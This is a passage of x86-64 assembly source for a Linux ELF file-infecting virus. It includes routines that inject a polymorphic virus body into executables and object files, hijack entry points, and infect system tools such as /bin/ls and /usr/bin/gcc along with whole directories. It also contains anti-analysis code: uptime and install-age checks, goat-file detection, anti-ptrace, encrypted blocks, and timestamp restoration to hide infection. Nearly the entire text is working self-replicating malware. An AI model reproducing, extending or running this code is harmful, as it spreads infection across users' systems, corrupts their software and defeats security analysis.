		test	rsi,rsi
		jz	.no_js
		push	JUNK_SYSCALL_size - 4
		pop	rcx
		call	RDA_Encode_CRC
		and	qword [g_poly_syscall],0
	.no_js:	cmp	dword [g_infection_status],1
		jb	.no_unlink
		je	.close
	%if RETAL_UNLINK_RENAME = RETAL_ENABLED
			INT3_CALL copy_over
			mov	rsi,[g_inputfilename_ptr]
			lea	rbx,[g_statbuf]
			jb	.close
			mov	edi,AT_FDCWD
			lea	rdx,[rbx+stat.st_atime]
			xor	r10,r10
			_syscall_ax 280		; utimensat
			push	rsi
			pop	rdi
			mov	esi,[rbx+stat.st_uid]
			mov	edx,[rbx+stat.st_gid]
			bp_syscall_al 92		; chown
	%endif
	.close:	lea	rsi,[g_fd_in]
		INT3_CALL close
		lodsq
		INT3_CALL close
		mov	rdi,[g_inputfilename_ptr]
		mov	esi,[g_statbuf+stat.st_mode]
		bp_syscall_al 90			; chmod

	%if RETAL_UNLINK_RENAME = RETAL_ENABLED
	.unlink:lea	rdi,[g_outputfilename_buf]
		cmp	byte [rdi],0
		je	.no_unlink
		bp_syscall_al 87	; unlink
	%endif
	.no_unlink:
		and	dword [g_infection_status],0
		END_EBLOCK_OPCODE

	.exit:	;  Restore entry rsp
		mov	rsp,[g_terminate_infection_rsp]
		jmp	qword [g_terminate_infection_address]

;-[clear_eblocks]-------------------------------------------------------------
; Encrypt outstanding EBLOCKS
%if RETAL_EBLOCKS == RETAL_ENABLED
ADD_FUNCTION
clear_eblocks:	VIRUS_DEBUG_STRING +clear_eblocks
		push	rcx
		mov	ecx,[g_EBLOCK_index]
		jrcxz	.no_eblocks
		.eblock_loop:	call	exit_eblock
				loop	.eblock_loop
	.no_eblocks:
		pop	rcx
		VIRUS_DEBUG_STRING -clear_eblocks
		ret
%endif

;-[check_uptime]--------------------------------------------------------------
; check os has been running for uptime_min minuites
ADD_FUNCTION
check_uptime:	VIRUS_DEBUG_STRING +check_uptime
		BEGIN_EBLOCK_OPCODE
		lea	rdi,[g_sysinfo]
		bp_syscall_al 99	; sysinfo
	.t:	jb	_terminate
		cmp	qword [rdi],MIN_UPTIME
		jb	.t
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -check_uptime
		ret

;-[check_new_os]--------------------------------------------------------------
; check that operating system was installed atleast CHECK_NEW_OS_DAYS days ago.
ADD_FUNCTION
check_new_os:	VIRUS_DEBUG_STRING +check_new_os
		BEGIN_EBLOCK_OPCODE
		call	_pusha
		call	.skip
			db '/etc/hostname',0
	.skip:	pop	rdi
		INT3_CALL get_stat_age
	.tb:	jb	_terminate
		cmp	rax,CHECK_NEW_OS_DAYS
		jb	.tb
		mov	[g_host_date],rbx
		cmp	[exe_host_date],rbx
		setz	byte [g_do_activate]
		call	_popa
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

;-[get_stat_age]--------------------------------------------------------------
; rdi = filename, get stat to g_statbuf, return rax = age in seconds, rbx = mtime, rsi = stat.
ADD_FUNCTION
get_stat_age:	VIRUS_DEBUG_STRING +get_stat_age
		BEGIN_EBLOCK_OPCODE
		lea	rsi,[g_statbuf]
		bp_syscall_al 4		; stat
		jb	.exit
		INT3_CALL time_null
		mov	rbx,[rsi+stat.st_mtime]
		sub	rax,rbx
		CHECK_BREAKPOINT
	.exit:	END_EBLOCK_OPCODE
		ret

;-[activate]------------------------------------------------------------------
; display activation message if file has been on machine for ACTIVATION_DAYS.
ADD_FUNCTION
activate:	VIRUS_DEBUG_STRING +activate
		BEGIN_EBLOCK_OPCODE
		call	_pusha
		cmp	byte [g_do_activate],0
		je	.exit
		INT3_CALL time_null
		cmp	rax,[exe_activate_date]
		jb	.exit
		INT3_CALL print_virus_name_string
		push	rdi
		pop	rsi
		call	.skip
			dq	7	; 7 seconds
			dq	0
	.skip:	pop	rdi
		bp_syscall_al 35		; nanosleep
	.exit:	call	_popa
		END_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		ret

;-[DA_infect]-----------------------------------------------------------------
; do direct action infection
ADD_FUNCTION
DA_infect:	call	_pusha
		; files
		da_file	"/bin/cp"
		da_file "/usr/bin/ld"
		da_file "/bin/ls"
		da_file "/usr/bin/gcc"
		da_file "/usr/bin/ld.gold"
		da_file "/usr/bin/ld.bfd"
		da_file "/usr/bin/zip"
		; dir's
		call	decrypt_DA
		ds_str	'.'
		INT3_CALL infect_dir
		INT3_CALL rand_prob
		js	.infect_bin
		jpo	.exit
		call	decrypt_DA
		ds_str	'/usr/bin'
		jmp	.id
	.infect_bin:
		call	decrypt_DA
		ds_str	'/bin'
	.id:	INT3_CALL infect_dir
	.exit:	call	_popa
		ret

;-[infect_file]---------------------------------------------------------------
; infect executable or relocatable pointed to by rdi.
ADD_FUNCTION
infect_file:	call	_pusha
		call	init_file
		cmp	al,'e'
		je	_infect_exe
		jmp	_infect_o
	.success:
		inc	dword [g_infection_status]
		jmp	_terminate_infection
	.exit:	call	_popa
		ret

;-[infect_exe]----------------------------------------------------------------
; infect executable pointed to by rdi.
ADD_FUNCTION
_infect_exe:	VIRUS_DEBUG_STRING +_infect_exe
		BEGIN_EBLOCK_OPCODE
		INT3_CALL read_Elf64
		; check for .o infection marker
		mov	ecx,[g_data_index]
		INT3_CALL get_section_by_index
		push	-3
		pop	rcx
		add	rcx,[rbx+Elf64_Shdr.sh_size]
		mov	rsi,[r15+MALLOC_HANDLE.addr]
	.ocl:		cmp	dword [rsi],O_TEXT_MARKER
			je	_terminate_infection
			inc	rsi
			loop	.ocl
		INT3_CALL check_exe_bss
		INT3_CALL get_exe_symbols
		END_EBLOCK_OPCODE
		INT3_CALL build_exe_virus_body
		BEGIN_EBLOCK_OPCODE
		mov	rax,[g_Elf64_Ehdr+Elf64_Ehdr.e_entry]
		mov	[g_poly_in_rip],rax
		mov	dword [g_poly_entry_offset],(exe_entry - virus_start)
		mov	qword [g_poly_in_size],virus_m_size
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		lea	rsi,[new_virus_shdr]
		push	qword [g_statbuf+stat.st_size]
		pop	qword [rsi+Elf64_Shdr.sh_offset]	; [shdr_offset]
		; prelink: check for .gnu.prelink_undo
		mov	ecx,[g_prelink_undo_index]
		jrcxz	.no_pl1
		INT3_CALL do_prelink1
	.no_pl1:mov	rcx,[g_max_phdr_vaddr]		; vaddr
		mov	rax,[rsi+Elf64_Shdr.sh_offset] 	; [shdr_offset]
		mov	rdx,[g_phdr_align]		; align
		dec	rdx
		and	rax,rdx
		add	rcx,rdx
		not	rdx
		and	rcx,rdx
		add	rax,rcx
		mov	[g_poly_load_addr],rax
		mov	[rsi+Elf64_Shdr.sh_addr],rax	; [shdr_address]
		push	rsi
		mov	ecx,[g_poly_exe_layers]
	.pl:		INT3_CALL poly_main
%if RETAL_POLY_DUMP_ENCRYPT == RETAL_ENABLED
			mov	rdi,[enc_file_num_rdi]
			inc	byte [rdi]
%endif
			or	dword [g_poly_entry_offset],-1
			push	rcx
			mov	rsi,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
			mov	rdi,[g_VirusBody_Handle+MALLOC_HANDLE.addr]
			mov	rcx,[g_poly_out_size]
			push	rcx
			rep	movsb
			pop	rax
			add	rax,3
			and	al,-4
			mov	[g_poly_in_size],rax
			pop	rcx
			push	qword [g_poly_out_rip]
			pop	qword [g_poly_in_rip]
			loop	.pl
		pop	rsi
		;mov	qword [rsi+Elf64_Shdr.sh_size],virus_p_size	; [shdr_size]
		mov	rax,[g_poly_out_size]
		mov	qword [rsi+Elf64_Shdr.sh_size],rax
		END_EBLOCK_OPCODE
		; prelink: add section
		cmp	dword [g_prelink_undo_index],0
		je	.no_prelink_build
		INT3_CALL do_prelink2
		jmp	.built
	.no_prelink_build:
		INT3_CALL copy_entire
	.built:	BEGIN_EBLOCK_OPCODE
		mov	rdi,[g_target_phdr]
		push	PT_LOAD
		pop	rax
		stosd				; p_type
		push	PF_X|PF_W|PF_R
		pop	rax
		stosd				; p_flags
		mov	rax,[rsi+Elf64_Shdr.sh_offset]		; [shdr_offset]
		stosq				; p_offset
		mov	r9,rax  ; (offset)
		mov	rax,[rsi+Elf64_Shdr.sh_addr]		; [shdr_address]
		stosq				; p_vaddr
		stosq				; p_paddr
%if virus_start != exe_entry
		;add	rax,offset_from(exe_entry,virus_start)
%endif
		mov	rax,[g_poly_out_rip]
		mov	[g_Elf64_Ehdr+Elf64_Ehdr.e_entry],rax
		mov	rax,[rsi+Elf64_Shdr.sh_size]		; [shdr_size]
		push	rax
		stosq				; p_filesz
		;mov	eax,virus_m_size
		push	rax
		pop	rbx
		mov	eax,P_MEMSZ_GROW
		INT3_CALL rand
		add	rax,rbx
		stosq				; p_memsz
		mov	rax,[g_phdr_align]
		stosq				; p_align
		cmp	dword [g_prelink_undo_index],0
		jne	.no_append
		;lea	r15,[g_VirusBody_Handle]
		lea	r15,[g_Poly_Virus_Handle]
		pop	r14	; shdr_size
		INT3_CALL write_to
		jnz	_terminate_infection
	.no_append:
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		INT3_CALL mark_infection
		INT3_CALL update_Elf64_Ehdr
		INT3_CALL update_phdrs
%if RETAL_PATCH_EXE_TEXT == RETAL_ENABLED
		INT3_CALL patch_text_prologs
		mov	ecx,[g_text_index]
		INT3_CALL update_section
%endif
%if RETAL_BTEA_DATA == RETAL_ENABLED
		INT3_CALL btea_enc
		mov	ecx,[g_data_index]
		INT3_CALL update_section
%endif
		cmp	dword [g_prelink_undo_index],0
		je	.no_pl2
		INT3_CALL update_prelink
	.no_pl2:
	%if RETAL_DT_CHECKSUM == RETAL_ENABLED
		call	get_exe_dyn
		call	calc_checksum
	%endif
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -_infect_exe
		jmp	infect_file.success

;-----------------------------------------------------------------------------
reloc_offset_check:	dq	0
reloc_offset_source:	dq	0
reloc_offset_func:	dq	0

dw_const_zero:		dd	0

_infect_o:	VIRUS_DEBUG_STRING +_infect_o
		BEGIN_EBLOCK_OPCODE
		INT3_CALL read_Elf64
		mov	eax,[g_data_index]
		mov	ecx,[g_bss_index]
		test	ecx,ecx
		jnz	.got_bss_index
		xchg	eax,ecx
	.got_bss_index:
		mov	[g_o_bss_index],ecx
		END_EBLOCK_OPCODE
		INT3_CALL build_o_virus_body
		BEGIN_EBLOCK_OPCODE
		INT3_CALL get_o_symbols
		mov	ecx,[g_text_index]
		INT3_CALL get_section_by_index
		mov	rax,[rbx+Elf64_Shdr.sh_size]
		mov	[g_poly_in_rip],rax
		mov	[g_poly_load_addr],rax
		mov	qword [g_poly_in_size],virus_p_size
		mov	dword [g_poly_entry_offset],(o_entry - virus_start)
		push	1
		pop	rcx
		INT3_CALL poly_main
		mov	rdi,[g_func_sym_entry]
		mov	ecx,[g_text_index]
		mov	rax,[g_poly_out_size]
		mov	[rdi+Elf64_Sym.st_size],rax
		mov	rsi,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
		add	rsi,virus_p_size
		INT3_CALL add_to_section
		xchg	[rdi+Elf64_Sym.st_value],rax
		push	rax
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		; already run check
		mov	ecx,[g_o_bss_index]		; add check zero dword
		movzx	rax,byte [g_poly_o_check_size]
		lea	rsi,[dw_const_zero]
		INT3_CALL add_to_section
		mov	r11,[reloc_offset_check]	; add check reloc
		mov	r10d,[g_o_bss_symboln]
		push	rax
		pop	r12
		INT3_CALL add_reloc
		; virus body
		mov	ecx,[g_data_index]
		mov	eax,virus_p_size
		mov	rsi,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
		INT3_CALL add_to_section
		mov	r11,[reloc_offset_source]
		mov	r10d,[g_data_symboln]
		add	rax,[g_poly_data_offset]
		push	rax
		pop	r12

		INT3_CALL add_reloc
		; return function address
		pop	r12 ; old function .text offset
		mov	r11,[reloc_offset_func]
		test	r11,r11
		js	.no_func_reloc
		mov	r10d,[g_text_symboln]
		INT3_CALL add_reloc
	.no_func_reloc:
		; O text (.data) marker
		mov	ecx,[g_data_index]
		push	4
		pop	rax
		call	.otm
			db	O_TEXT_MARKER
	.otm:	pop	rsi
		INT3_CALL add_to_section
		inc	esi
		INT3_CALL rebuild_Elf64
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -_infect_o
		jmp	infect_file.success

;-[infect_dir]----------------------------------------------------------------
; infect all files in directory pointed to by rdi.
ADD_FUNCTION
infect_dir:	VIRUS_DEBUG_STRING +infect_dir
		call	_pusha
		bp_syscall_al 80		; chdir
		jb	.exit
		mov	dword [g_terminate_chdir],1
		lea	r15,[g_dirent_Handle]
		cmp	qword [r15+MALLOC_HANDLE.addr],0
		jne	.no_alloc
			mov	ebx,(64 * 1024)
			INT3_CALL malloc
	.no_alloc:
		call	.popdot
			db	'.',0
	.popdot:pop	rdi
		xor	rsi,rsi		; O_RDONLY
		bp_syscall_al 2		; open
		jb	.exit_chdir
		mov	[g_fd_dir],rax
	.getdents_loop:	mov	rdi,[g_fd_dir]
			mov	rsi,[g_dirent_Handle+MALLOC_HANDLE.addr]
			mov	edx,(64 * 1024)
			bp_syscall_al 78			; getdents
			jb	.exit_chdir
			test	eax,eax
			jz	.exit_chdir
			lea	r8,[rsi+rax]		; max buffer
			.recloop:
				call	time_null
				cmp	rax,[g_direct_action_timeout]
				ja	.exit_chdir
				lea	rdi,[rsi+linux_dirent_size]
				call	infect_file
				movzx	rdi,word [rsi+linux_dirent.d_reclen]
				add	rsi,rdi
				cmp	rsi,r8
				jb	.recloop
			jmp	.getdents_loop
	.exit_chdir:
		lea	rdi,[g_cwd_buf]
		bp_syscall_al 80		; chdir
	.exit:	and	dword [g_terminate_chdir],0
		call	_popa
		ret

;-[do_prelink1]---------------------------------------------------------------
; check for valid prelink sections and rebuild if so instead of copy,
; return CF on no_prelink.
ADD_FUNCTION
do_prelink1:	VIRUS_DEBUG_STRING +do_prelink1
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx,rbx,r15

		movzx	rax,word [g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
		dec	eax
		cmp	[g_Elf64_Ehdr+Elf64_Ehdr.e_shstrndx],ax
		jne	.exit
		dec	eax
		cmp	eax,ecx
		jne	.exit
		INT3_CALL get_section_by_index
		push	qword [rbx+Elf64_Shdr.sh_offset]
		pop	qword [shdr_offset]

	.exit:	multipop rax,rcx,rbx,r15
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

;-[do_prelink2]---------------------------------------------------------------
; for prelink: Create new virus Shdr and rebuild.
ADD_FUNCTION
do_prelink2:	VIRUS_DEBUG_STRING +do_prelink2
		BEGIN_EBLOCK_OPCODE
		call	_pusha
		mov	ecx,[g_prelink_undo_index]
		inc	word [g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
		add	qword [g_shdrs_size],Elf64_Shdr_size
		INT3_CALL get_section_by_index
		push	r15
		push	rbx
		push	r15
		push	rbx
		pop	rsi
		lea	rdi,[rsi+(Elf64_Shdr_size * 3)]		; Create shdr cave
		;add	rsi,Elf64_Shdr_size
		push	(Elf64_Shdr_size * 2)
		pop	rcx
		add	rsi,rcx
		std
		dec	rdi
		dec 	rsi
		rep	movsb
		pop	rsi
		lea	rdi,[rsi+(MALLOC_HANDLE_size * 3)]	; Create shdr MALLOC handle cave
		;add	rsi,MALLOC_HANDLE_size
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		push	(MALLOC_HANDLE_size * 2)
		pop	rcx
		add	rsi,rcx
		dec	rdi
		dec	rsi
		rep	movsb
		pop	rdi					; Replace with new shdr
		push	rdi
		pop	rbp					; (rbp = virus shdr)
		lea	rsi,[new_virus_shdr]
		push	Elf64_Shdr_size
		pop	rcx
		cld
		rep	movsb
		pop	rdi					; Create section image
		mov	r15,rdi
		xor	rax,rax
		stosd
		stosq
		;mov	ebx,virus_m_size
		mov	rbx,[g_poly_out_size]
		push	rbx
		INT3_CALL malloc
		push	rax
		pop	rdi
		;mov	rsi,[g_VirusBody_Handle+MALLOC_HANDLE.addr]
		mov	rsi,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
		;mov	rcx,virus_m_size
		pop	rcx
		END_EBLOCK_OPCODE
		rep	movsb
		BEGIN_EBLOCK_OPCODE
		inc	dword [g_prelink_undo_index]
		inc	word [g_Elf64_Ehdr+Elf64_Ehdr.e_shstrndx]
		mov	rax,[rbp+Elf64_Shdr.sh_offset]			; update .gnu.prelink_undo
		add	rax,[rbp+Elf64_Shdr.sh_size]
		add	rbp, Elf64_Shdr_size
		add	qword [rbp+Elf64_Shdr.sh_size],Elf64_Shdr_size
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		mov	rcx,[rbp+Elf64_Shdr.sh_addralign]
		jrcxz	.na1
		dec	rcx
		add	rax,rcx
		not	rcx
		and	rax,rcx
	.na1:	mov	[rbp+Elf64_Shdr.sh_offset],rax
		add	rax,[rbp+Elf64_Shdr.sh_size]			; update .shstrndx
		add	rbp, Elf64_Shdr_size
		mov	rcx,[rbp+Elf64_Shdr.sh_addralign]
		jrcxz	.na2
		dec	rcx
		add	rax,rcx
		not	rcx
		and	rax,rcx
	.na2:	mov	[rbp+Elf64_Shdr.sh_offset],rax


		INT3_CALL rebuild_Elf64

		call	_popa
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

;-[update_prelink]------------------------------------------------------------
; update .gnu.prelink_undo
ADD_FUNCTION
update_prelink:	VIRUS_DEBUG_STRING +update_prelink
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		call	_pusha
		mov	ecx,[g_prelink_undo_index]
		INT3_CALL get_section_by_index
		mov	r8,[r15+MALLOC_HANDLE.addr]
		test	r8,r8					; r8 = ehdr
		jz	.exit
		mov	r12,rcx					; r12 = prelink_undo_index
		mov	r10,[rbx+Elf64_Shdr.sh_size]
		lea	r10,[r10+r8-Elf64_Shdr_size]		; r10 = shdr target
		; Find Phdr
		lea	rdi,[r8+Elf64_Ehdr_size]
		movzx	rcx,word [r8+Elf64_Ehdr.e_phnum]
		push	rcx
		push	rdi
	.pt_phdr_loop:	cmp	dword [rdi+Elf64_Phdr.p_type],PT_NOTE
			je	.pt_phdr_found
			add	rdi,Elf64_Phdr_size
			loop	.pt_phdr_loop
			pop	rcx
			pop	rcx
			jmp	.exit
	.pt_phdr_found:
		mov	r9,rdi					; r9 = phdr
		pop	rdi
		pop	rcx
		; fix Ehdr
		lea	rsi,[g_Elf64_Ehdr]
		mov	ax,[r8+Elf64_Ehdr.e_shnum]
		mov	bx,[r8+Elf64_Ehdr.e_phnum]
		mov	bp,[r8+Elf64_Ehdr.e_shstrndx]
		mov	rdi,r8
		push	Elf64_Ehdr_size
		pop	rcx
		rep	movsb
		inc	ax
		mov	[r8+Elf64_Ehdr.e_shnum],ax
		mov	[r8+Elf64_Ehdr.e_phnum],bx
		mov	[r8+Elf64_Ehdr.e_shstrndx],bp
		; fix Phdr
		mov	rsi,[g_target_phdr]
		mov	rdi,r9
		push	Elf64_Phdr_size
		pop	rcx
		rep	movsb
		; fix Shdr
		mov	rdi,r10
		lea	rsi,[new_virus_shdr]
		push	Elf64_Shdr_size
		pop	rcx
		rep	movsb

		mov	rcx,r12
		INT3_CALL update_section

	.exit:	call	_popa
		END_EBLOCK_OPCODE
		ret

;-[new_virus_shdr]------------------------------------------------------------
; shdr created for prelink executables.
new_virus_shdr:		dd	0					; sh_name
			dd	SHT_PROGBITS				; sh_type
			dq	SHF_WRITE|SHF_ALLOC|SHF_EXECINSTR	; sh_flags
	shdr_address:	dq	0					; sh_addr
	shdr_offset:	dq	0					; sh_offset
	shdr_size:	dq	0					; sh_size
			dd	0					; sh_link
			dd	0					; sh_info
			dq	1					; sh_addralign
			dq	0					; sh_entsize

;-[read_Elf64]----------------------------------------------------------------
; Read Ehdr, PHDRS, SHDRS, Section images.
; Allocates memory as needed.
; _terminate infection on error.
ADD_FUNCTION
read_Elf64:	VIRUS_DEBUG_STRING +read_Elf64
		BEGIN_EBLOCK_OPCODE
		INT3_CALL open_files
		;
		; Attempt to read and check ELF64 header.
		;
		mov	rdi,[g_fd_in]
		lea	rsi,[g_Elf64_Ehdr]
		mov	edx,Elf64_Ehdr_size
		bp_syscall_al 0		; read
	.tb0:	jb	_terminate_infection
		cmp	rax,rdx
	.tne0:	jne	_terminate_infection
		;
		; Check Elf64_Ehdr fields.
		;
		;cmp	dword [rsi],ELF64_MAGIC			; EI_MAG0...EI_MAG3
		lodsd
		cmp	eax,ELF64_MAGIC
		jne	.tne0

		;cmp	byte [rsi+EI_CLASS],ELFCLASS64		; EI_CLASS 64-bit
		;jne	.tne0
		;cmp	byte [rsi+EI_DATA],ELFDATA2LSB		; EI_DATA Little-Endian
		;jne	.tne0
		;cmp	byte [rsi+EI_VERSION],EV_CURRENT	; EI_VERSION Current
		;jne	.tne0
		;cmp	byte [rsi+EI_OSABI],ELFOSABI_SYSV	; EI_OSABI Unix SYSV
		;jne	.tne0
		lodsd
		cmp	eax,(ELFCLASS64\
		 | (ELFDATA2LSB << 8)\
		 | (EV_CURRENT << 16)\
		 | (ELFOSABI_SYSV << 24))
	.tne1:	jne	.tne0

		;cmp	byte [rsi+EI_ABIVERSION],0		; ABIVERSION 0?
		lodsb
		test	al,al
		jne	.tne1

		;cmp	dword [rsi+EI_PAD],0			; Already infected?
		lodsd
		test	eax,eax
		jne	.tne1

		cmp	word [rsi-13+Elf64_Ehdr.e_ehsize],dx	; Correct EHdr Size?
	.tne2:	jne	.tne1
		cmp	word [rsi-13+Elf64_Ehdr.e_machine],EM_X86_64 ; x64?
		jne	.tne2
		cmp	word [rsi-13+Elf64_Ehdr.e_shentsize],Elf64_Shdr_size
	.tne3:	jne	.tne2
		cmp	word [rsi-13+Elf64_Ehdr.e_shnum],6		; Atleast 6 SHDR's.
	.tb1:	jb	.tb0
%if RETAL_ANTI_PTRACE1 == RETAL_ENABLED
		call	anti_ptrace1
%endif
		END_EBLOCK_OPCODE
		movzx	rdx,word [rsi-13+Elf64_Ehdr.e_phnum]
		cmp	word [rsi-13+Elf64_Ehdr.e_type],ET_REL	; Relocatable Object?
		je	.e_type_relocatable
		cmp	word [rsi-13+Elf64_Ehdr.e_type],ET_EXEC	; Executable Object
		jne	_terminate_infection
		; Handle Executable
		BEGIN_EBLOCK_OPCODE
		INT3_CALL zf_if_ofile
		jz	_terminate_infection
		cmp	word [rsi-13+Elf64_Ehdr.e_phentsize],Elf64_Phdr_size
	.tne5:	jne	_terminate_infection
		cmp	edx,4		; Atleast 4 PHDR's in Executables
	.tb2:	jb	_terminate_infection
		;
		; Read Phdrs.
		;
		cmp	edx,MAX_PHDR_COUNT	; Too many phdrs?
		ja	_terminate_infection
		lea	r15,[g_phdrs_handle]
		mov	ebx,(MAX_PHDR_COUNT * Elf64_Phdr_size)
		INT3_CALL malloc
		imul	r14,rdx,Elf64_Phdr_size
		mov	[g_phdrs_size],r14
		mov	r13,[rsi-13+Elf64_Ehdr.e_phoff]
		INT3_CALL read_from
		jnz	.tne5
		INT3_CALL do_exe_phdrs
		END_EBLOCK_OPCODE
		jmp	.read_shdrs
		; Relocatables?
	.e_type_relocatable:
		BEGIN_EBLOCK_OPCODE
		INT3_CALL zf_if_ofile
	.nzftz:	jne	_terminate_infection
		test	edx,edx
	.doctz:	jnz	.nzftz
		END_EBLOCK_OPCODE
	.read_shdrs:
		BEGIN_EBLOCK_OPCODE
		;
		; Read Sections/Shdrs.
		;
%if RETAL_GOAT_CHECK == RETAL_ENABLED
		INT3_CALL goat_checkname
%endif
		cmp	word [rsi-13+Elf64_Ehdr.e_shnum],MAX_SHDR_COUNT - 1 ; Too many shdrs?
		ja	_terminate_infection
		lea	r15,[g_shdrs_handle]
		mov	ebx,(MAX_SHDR_COUNT * Elf64_Shdr_size)
		INT3_CALL malloc
		movzx	r14,word [rsi-13+Elf64_Ehdr.e_shnum]
		shl	r14,6
		mov	[g_shdrs_size],r14
		mov	r13,[rsi-13+Elf64_Ehdr.e_shoff]
		INT3_CALL read_from
		jnz	_terminate_infection
		END_EBLOCK_OPCODE
		;
		; Read Section Images, Get Reloc Sections.
		;
		; rcx=section (index), rbx=shdr table, r15=MALLOC_HANDLE table
		BEGIN_EBLOCK_OPCODE
%if RETAL_GOAT_CHECK == RETAL_ENABLED
		INT3_CALL goat_checksize		; goat file length check
%endif
		xor	rcx,rcx
		.section_loop:
			INT3_CALL get_section_by_index
			; Read Section Image
			cmp	dword [rbx+Elf64_Shdr.sh_type],SHT_NOBITS
			je	.skip_image_read
			push	rbx
			mov	rax,[rbx+Elf64_Shdr.sh_size]
			push	rax
			mov	r13,[rbx+Elf64_Shdr.sh_offset]
			add	rax,r13
			jc	_terminate_infection
			cmp	rax,[g_statbuf+stat.st_size]
			ja	_terminate_infection
			pop	rbx
			INT3_CALL malloc_extra
			mov	r14,rbx
			pop	rbx
			INT3_CALL read_from
			jnz	_terminate_infection
		.skip_image_read:
			; Get Relocs
			cmp	dword [rbx+Elf64_Shdr.sh_type],SHT_RELA
			;je	.section_is_reloc
			;cmp	dword [rbx+Elf64_Shdr.sh_type],SHT_REL
			jne	.section_not_reloc
		.section_is_reloc:
			mov	eax,[rbx+Elf64_Shdr.sh_info]
			lea	rdx,[g_section_reloc_list]
			mov	[rdx+(rax*4)],ecx
		.section_not_reloc:
			inc	ecx
			cmp	cx,word [g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
			jb	.section_loop
		END_EBLOCK_OPCODE
		;
		; Find section indexes by name
		;
		BEGIN_EBLOCK_OPCODE
		movzx	rcx,word [g_Elf64_Ehdr+Elf64_Ehdr.e_shstrndx]
		INT3_CALL get_section_by_index
		mov	rbp,[r15+MALLOC_HANDLE.addr]
		xor	rcx,rcx
	.section_name_loop:
			INT3_CALL get_section_by_index
			mov	esi,[rbx+Elf64_Shdr.sh_name]
			test	esi,esi
			js	_terminate_infection
			add	rsi,rbp
			INT3_CALL strhash32
			call	.skip_names
			lstrhash32 .text		; .text?
			dd	strhash32_val
			lstrhash32 .data		; .data?
			dd	strhash32_val
			lstrhash32 .bss			; .bss?
			dd	strhash32_val
			lstrhash32 .plt			; .plt?
			dd	strhash32_val
			lstrhash32 .dynamic		; .dynamic
			dd	strhash32_val
			lstrhash32 .gnu.prelink_undo	; .gnu.prelink_undo
			dd	strhash32_val
			lstrhash32 .rela.dyn
			dd	strhash32_val
			lstrhash32 .rodata
			dd	strhash32_val
		.skip_names:
			pop	rdi
			xor	rsi,rsi
		.name_loop:
			scasd
			je	.got_name
			inc	esi
			cmp	esi,8
			jb	.name_loop
			jmp	.section_name_next
		.got_name:
			lea	rdi,[g_text_index]
			mov	[rdi+(rsi*4)],ecx
		.section_name_next:
			inc	ecx
			cmp	cx,word [g_Elf64_Ehdr+Elf64_Ehdr.e_shnum]
			jb	.section_name_loop
			cmp	dword [g_text_index],0
		.te1:	je	_terminate
			cmp	dword [g_data_index],0
			je	.te1
%if RETAL_GOAT_CHECK == RETAL_ENABLED
			INT3_CALL goat_checktextcrc32	; goat file .text crc32 check
%endif
		END_EBLOCK_OPCODE
		;
		; Find .dynsym, and its string table.
		;
		BEGIN_EBLOCK_OPCODE
		cmp	byte [g_poly_setup_done],0
		jne	.poly_done
		INT3_CALL setup_poly
	.poly_done:
		mov	eax,[g_plt_index]		; plt relocs for executables
		cmp	word [g_Elf64_Ehdr+Elf64_Ehdr.e_phnum],0
		jnz	.dorel
		mov	eax,[g_text_index]		; text index for relocatables
	.dorel:	INT3_CALL get_section_reloc_index
	.tiz2:	jz	_terminate_infection
		call	.get_sh_link
		mov	[g_dynsym_index],ecx		; ecx = .dynsym
		call	.get_sh_link			; ecx = .dynsym strtab
		mov	[g_dynsym_strtab_index],ecx
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -read_Elf64
	.ret:	ret

ADD_FUNCTION
	.get_sh_link:
		BEGIN_EBLOCK_OPCODE
		INT3_CALL get_section_by_index
		mov	ecx,[rbx+Elf64_Shdr.sh_link]
		test	ecx,ecx
		jz	_terminate_infection
		END_EBLOCK_OPCODE
		ret

%if RETAL_GOAT_CHECK == RETAL_ENABLED
;-[goat_checksize]------------------------------------------------------------
; Check for goat files: Terminate virus if victim files change in length a
; constant amount, 4 files in a row.
ADD_FUNCTION
goat_checksize:	CHECK_BREAKPOINT
		multipush rax,rsi
		lea	rsi,[g_last_fsize]
		mov	eax,[g_statbuf+stat.st_size]
		jmp	goat_check

;-[goat_checkname]------------------------------------------------------------
; Check for goat files: Terminate virus if victim names change in sum a
; constant amount (consecutive filenames), 4 files in a row.
ADD_FUNCTION
goat_checkname:	CHECK_BREAKPOINT
		multipush rax,rsi
		lea	rsi,[g_last_fname_sum]
		mov	eax,[(rsi-g_last_fname_sum)+g_cur_fname_sum]
		; Continue on to goat_check
;-[goat_check]----------------------------------------------------------------
; check for consecutive filesize/filename
; eax = current value, rsi=pointer to sum/delta/count variable.
ADD_FUNCTION
goat_check:	BEGIN_EBLOCK_OPCODE
		push	rbx
		mov	ebx,[rsi]
		sub	ebx,eax
		mov	[rsi],eax
		cmp	[(rsi-g_last_fsize)+g_last_fsize_delta],ebx
		jne	.new_delta
		; same delta - check for 4 in a row
		inc	dword [(rsi-g_last_fsize)+g_last_fsize_count]
		cmp	dword [(rsi-g_last_fsize)+g_last_fsize_count],3
		jae	_terminate
		jmp	.exit
		; new delta - reset
	.new_delta:
		mov	[(rsi-g_last_fsize)+g_last_fsize_delta],ebx
		and	dword [(rsi-g_last_fsize)+g_last_fsize_count],0
	.exit:	pop	rbx
		END_EBLOCK_OPCODE
		multipop rax,rsi
		CHECK_BREAKPOINT
		ret

